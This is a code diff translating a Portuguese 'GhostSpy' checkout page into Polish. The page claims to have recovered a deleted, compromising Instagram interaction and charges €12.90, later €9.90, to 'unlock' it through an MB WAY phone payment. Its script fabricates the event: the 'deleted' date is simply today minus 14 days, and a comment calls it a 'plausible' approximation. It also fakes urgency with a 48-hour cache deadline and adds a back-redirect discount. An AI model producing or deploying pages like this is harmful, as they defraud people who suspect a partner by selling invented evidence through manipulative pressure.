@@ -1,8 +1,8 @@
 <!doctype html>
-<html lang="pt-PT">
+<html lang="pl">
 <head>
 <meta charset="utf-8" />
-<title>Evento Suspeito Detectado | GhostSpy</title>
+<title>Wykryto Podejrzane Zdarzenie | GhostSpy</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
 <meta name="robots" content="noindex" />
 <link rel="icon" type="image/png" href="/favicon.png" />
@@ -94,42 +94,42 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
 <div class="wrap">
 
   <div class="alert-bar">
-    <b>⚠ Sinal de Atividade Suspeita Detectado</b>
-    O nosso sistema encontrou algo enquanto preparava o painel
+    <b>⚠ Wykryto Sygnał Podejrzanej Aktywności</b>
+    Nasz system coś znalazł podczas przygotowywania panelu
   </div>
 
   <div class="card" id="step-pitch">
     <div class="radar" aria-hidden="true">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="4"/><circle cx="12" cy="12" r="1" fill="currentColor"/></svg>
     </div>
-    <p class="kicker">Enquanto preparávamos o seu painel…</p>
-    <h1 class="title">Encontrámos <em>1 evento</em> que foi apagado há 14 dias</h1>
+    <p class="kicker">Podczas przygotowywania Twojego panelu…</p>
+    <h1 class="title">Znaleźliśmy <em>1 zdarzenie</em>, które zostało usunięte 14 dni temu</h1>
     <p class="sub">
-      Durante a análise do perfil, cruzámos a timeline pública com o <b>cache de metadados</b> do Instagram
-      e encontrámos <b>1 interação comprometedora</b> que foi removida por volta de
+      Podczas analizy profilu porównaliśmy publiczną oś czasu z <b>pamięcią podręczną metadanych</b> Instagrama
+      i znaleźliśmy <b>1 kompromitującą interakcję</b>, która została usunięta około
       <b id="date-deleted">—</b>.
     </p>
 
     <div class="report">
       <div class="report-row">
-        <span class="k">Tipo de evento</span>
-        <span class="v">Interação directa</span>
+        <span class="k">Rodzaj zdarzenia</span>
+        <span class="v">Bezpośrednia interakcja</span>
       </div>
       <div class="report-row">
-        <span class="k">Data aproximada</span>
+        <span class="k">Przybliżona data</span>
         <span class="v" id="date-row">—</span>
       </div>
       <div class="report-row">
-        <span class="k">Período do dia</span>
-        <span class="v">Entre as 23h e as 2h</span>
+        <span class="k">Pora dnia</span>
+        <span class="v">Między 23:00 a 2:00</span>
       </div>
       <div class="report-row">
-        <span class="k">Com conta já existente</span>
-        <span class="v tag">⚠ ALTA SUSPEIÇÃO</span>
+        <span class="k">Z już istniejącym kontem</span>
+        <span class="v tag">⚠ WYSOKIE PODEJRZENIE</span>
       </div>
       <div class="report-row">
-        <span class="k">Estado actual</span>
-        <span class="v">Eliminado da linha pública</span>
+        <span class="k">Aktualny status</span>
+        <span class="v">Usunięte z publicznej osi czasu</span>
       </div>
     </div>
 
@@ -137,23 +137,23 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
       <div class="bg"></div>
       <div class="lock">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3.5" y="10.5" width="17" height="11" rx="2"/><path d="M7 10.5V7a5 5 0 0 1 10 0v3.5"/></svg>
-        <b>CONTEÚDO BLOQUEADO</b>
-        <small>Reconstrução disponível após desbloqueio</small>
+        <b>ZABLOKOWANA TREŚĆ</b>
+        <small>Rekonstrukcja dostępna po odblokowaniu</small>
       </div>
     </div>
 
     <p class="sub">
-      A nossa equipa consegue <b>reconstruir o conteúdo</b> a partir do cache em menos de 5 minutos.
-      <b>Avise-se</b>: o cache é apagado automaticamente no servidor do Instagram em <b>48h</b> — se não desbloquear agora, <b>perde a janela para sempre</b>.
+      Nasz zespół może <b>zrekonstruować treść</b> z pamięci podręcznej w mniej niż 5 minut.
+      <b>Uwaga</b>: pamięć podręczna jest automatycznie usuwana z serwera Instagrama w ciągu <b>48h</b> — jeśli nie odblokujesz teraz, <b>tracisz to okno na zawsze</b>.
     </p>
 
     <div class="price-box">
-      <div class="now">€12,90</div>
-      <span class="once">Pagamento único · Janela fecha em 48h</span>
+      <div class="now">12,90 €</div>
+      <span class="once">Jednorazowa płatność · Okno zamyka się za 48h</span>
     </div>
 
     <div class="phone-ask" id="phone-ask-box">
-      <label>Confirme o seu MB WAY</label>
+      <label>Potwierdź swój numer MB WAY</label>
       <div class="phone-row">
         <input name="country_code" value="351" maxlength="3" inputmode="numeric" />
         <input name="phone" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="9" minlength="9" placeholder="912 345 678" />
@@ -163,22 +163,22 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
     <div class="err hidden" id="err-box"></div>
 
     <button type="button" class="btn-yes" id="btn-yes">
-      <span class="lbl">🔓 Desbloquear e Ver Agora</span>
-      <span class="sub">Pagamento único de €12,90</span>
+      <span class="lbl">🔓 Odblokuj i Zobacz Teraz</span>
+      <span class="sub">Jednorazowa płatność 12,90 €</span>
     </button>
 
     <p class="notes">
-      Conteúdo entregue em até 5 min após confirmação · 30 dias de garantia incondicional
+      Treść dostarczona w ciągu 5 min po potwierdzeniu · 30 dni gwarancji bezwarunkowej
     </p>
   </div>
 
   <div class="card hidden" id="step-pending">
     <div class="pending">
       <div class="spinner" aria-hidden="true"></div>
-      <h1 class="title">Confirme no telemóvel</h1>
-      <p class="sub">Acabámos de enviar o pedido para a app <b>MB WAY</b>. Aceite para desbloquear a reconstrução.</p>
+      <h1 class="title">Potwierdź na telefonie</h1>
+      <p class="sub">Właśnie wysłaliśmy żądanie do aplikacji <b>MB WAY</b>. Zaakceptuj, aby odblokować rekonstrukcję.</p>
       <div style="text-align:center;font-weight:800;font-size:28px;margin:10px 0" id="countdown">5:00</div>
-      <p class="notes">A página atualiza automaticamente.</p>
+      <p class="notes">Strona odświeży się automatycznie.</p>
     </div>
   </div>
 
@@ -213,7 +213,7 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
   var currentSku   = 'upsell_descoberta';
   var currentPrice = 12.90;
   var currentCId   = 'ghostspy-descoberta';
-  var currentCName = 'GhostSpy Relatorio de Evento Suspeito';
+  var currentCName = 'GhostSpy Raport Podejrzanego Zdarzenia';
 
   function pushPurchaseDataLayer(id, value){
     try {
@@ -236,19 +236,19 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
     currentSku   = 'upsell_descoberta_discount';
     currentPrice = 9.90;
     currentCId   = 'ghostspy-descoberta-discount';
-    currentCName = 'GhostSpy Evento Suspeito (Ultima Oferta)';
+    currentCName = 'GhostSpy Podejrzane Zdarzenie (Ostatnia Oferta)';
     var nowEl = document.querySelector('.price-box .now');
     var onceEl = document.querySelector('.price-box .once');
-    if (nowEl) nowEl.textContent = '€9,90';
-    if (onceEl) onceEl.textContent = '🔥 Última chance · Janela fecha em 48h';
+    if (nowEl) nowEl.textContent = '9,90 €';
+    if (onceEl) onceEl.textContent = '🔥 Ostatnia szansa · Okno zamyka się za 48h';
     // Banner topo (substitui o alerta vermelho existente)
     var existing = document.querySelector('.alert-bar');
     if (existing){
       existing.style.background = 'linear-gradient(135deg,#F59E0B,#D97706)';
-      existing.innerHTML = '<b>🎁 DESCONTO EXCLUSIVO APLICADO</b>Economize €10 — só nesta tentativa';
+      existing.innerHTML = '<b>🎁 ZASTOSOWANO EKSKLUZYWNĄ ZNIŻKĘ</b>Zaoszczędź 10 € — tylko przy tej próbie';
     }
     var sub = document.querySelector('.btn-yes .sub');
-    if (sub) sub.innerHTML = '<s style="opacity:.7;margin-right:6px">€12,90</s> €9,90';
+    if (sub) sub.innerHTML = '<s style="opacity:.7;margin-right:6px">12,90 €</s> 9,90 €';
     btnOriginalHTML = document.getElementById('btn-yes').innerHTML;
     try { if (window.fbq) fbq('trackCustom', 'BackRedirectDiscount', {name:'Descoberta', value:9.90, currency:'EUR'}); } catch(_){}
   }
@@ -268,7 +268,7 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
   // Data "aproximada" plausível: hoje - 14 dias.
   var d = new Date(Date.now() - 14*86400*1000);
   var dd = String(d.getDate()).padStart(2,'0');
-  var meses = ['Jan','Fev','Mar','Abr','Mai','Jun','Jul','Ago','Set','Out','Nov','Dez'];
+  var meses = ['sty','lut','mar','kwi','maj','cze','lip','sie','wrz','paź','lis','gru'];
   var dateStr = dd + ' ' + meses[d.getMonth()] + ' ' + d.getFullYear();
   $('date-deleted').textContent = dateStr;
   $('date-row').textContent = dateStr;
@@ -301,7 +301,7 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
 
   var btnOriginalHTML = $('btn-yes').innerHTML;
   function setBtnLoading(on){
-    if (on) $('btn-yes').innerHTML = '<span class="lbl">A enviar pedido…</span>';
+    if (on) $('btn-yes').innerHTML = '<span class="lbl">Wysyłanie żądania…</span>';
     else    $('btn-yes').innerHTML = btnOriginalHTML;
   }
 
@@ -309,7 +309,7 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
     hideErr();
     var phone = (document.querySelector('[name=phone]').value || '').replace(/\D+/g,'');
     var cc    = (document.querySelector('[name=country_code]').value || '351').replace(/\D+/g,'') || '351';
-    if (phone.length < 9){ showErr('Número MB WAY inválido.'); return; }
+    if (phone.length < 9){ showErr('Nieprawidłowy numer MB WAY.'); return; }
 
     $('btn-yes').disabled = true;
     setBtnLoading(true);
@@ -335,12 +335,12 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
       $('btn-yes').disabled = false;
       setBtnLoading(false);
       if (res.status >= 400){
-        showErr((res.body && res.body.message) || 'Erro ao criar pagamento. Tente novamente.');
+        showErr((res.body && res.body.message) || 'Błąd podczas tworzenia płatności. Spróbuj ponownie.');
         return;
       }
       var data = (res.body && res.body.data) || {};
       currentId = data.id;
-      if (!currentId){ showErr('Resposta inválida do gateway.'); return; }
+      if (!currentId){ showErr('Nieprawidłowa odpowiedź bramki płatności.'); return; }
       setStep('step-pending');
       startCountdown(data.expires_at);
       startPolling();
@@ -348,7 +348,7 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
     .catch(function(){
       $('btn-yes').disabled = false;
       setBtnLoading(false);
-      showErr('Erro de ligação. Tente novamente.');
+      showErr('Błąd połączenia. Spróbuj ponownie.');
     });
   });
 
@@ -401,16 +401,16 @@ html,body{margin:0;padding:0;background:var(--bg);color:#F8FAFC;font-family:Inte
 </script>
 <footer style="max-width:420px;margin:24px auto 0;padding:16px 10px 0;border-top:1px solid #E2E8F0;text-align:center;font-family:Inter,system-ui,sans-serif;font-size:11px;line-height:1.6;color:#94A3B8">
   GhostSpy — Jordana Frade · NIF 246990120<br/>
-  Travessa de Além Rio, 50, 4780-460 Santo Tirso, Porto, Portugal<br/>
+  Travessa de Além Rio 50, 4780-460 Santo Tirso, Porto, Portugalia<br/>
   Tel: <a href="tel:+351252837400" style="color:#94A3B8">+351 252 837 400</a> ·
   <a href="mailto:suporte@ghostemail.com" style="color:#94A3B8">suporte@ghostemail.com</a><br/>
-  <a href="/politica-de-privacidade" style="color:#94A3B8">Privacidade</a> ·
-  <a href="/termos-de-uso" style="color:#94A3B8">Termos</a> ·
-  <a href="/trocas-e-devolucoes" style="color:#94A3B8">Trocas e Devoluções</a> ·
-  <a href="/politica-de-entrega" style="color:#94A3B8">Entrega</a> ·
-  <a href="/politica-de-reembolso" style="color:#94A3B8">Reembolso</a> ·
-  <a href="/sobre-nos" style="color:#94A3B8">Sobre Nós</a> ·
-  <a href="/contato" style="color:#94A3B8">Contato</a>
+  <a href="/politica-de-privacidade" style="color:#94A3B8">Prywatność</a> ·
+  <a href="/termos-de-uso" style="color:#94A3B8">Regulamin</a> ·
+  <a href="/trocas-e-devolucoes" style="color:#94A3B8">Zwroty i wymiany</a> ·
+  <a href="/politica-de-entrega" style="color:#94A3B8">Dostawa</a> ·
+  <a href="/politica-de-reembolso" style="color:#94A3B8">Zwrot pieniędzy</a> ·
+  <a href="/sobre-nos" style="color:#94A3B8">O nas</a> ·
+  <a href="/contato" style="color:#94A3B8">Kontakt</a>
 </footer>
 </body>
 </html>
